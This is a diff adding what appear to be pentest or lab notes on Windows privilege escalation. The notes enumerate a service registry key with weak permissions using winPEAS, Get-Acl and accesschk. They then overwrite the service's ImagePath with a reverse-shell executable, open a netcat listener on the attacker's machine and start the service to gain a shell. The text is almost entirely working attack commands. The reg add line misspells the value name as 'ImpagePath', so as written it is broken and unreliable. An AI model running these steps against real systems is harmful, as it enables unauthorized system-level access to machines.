@@ -129,5 +129,33 @@ net start <service>
 
 PRIVESC DONE
 
-                                                                  
+                                                                  Weak Registry permissions
+first run winpeas to see if there is weak registry permissions:
+winPEASany.exe quiet servicesinfo
+
+verify the permissions on the registry with powershell;
+powershell -exec bypass
+
+Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+
+use accesschk to verfy that we can start the service:
+accesschk.exe /accepteula -ucqv <user> regsvc
+
+make sure you see this uotput from the above command:
+SERVICE_START
+SERVICE_STOP
+
+next check the current values in the service registry entry:
+reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
+
+next change the ImagePath to our reverse shell:
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImpagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+
+start a listner on the attacking machine:
+nc -nlvp 1337
+
+finally start the service:
+net start <service>
+
+PRIVESC DONE
 
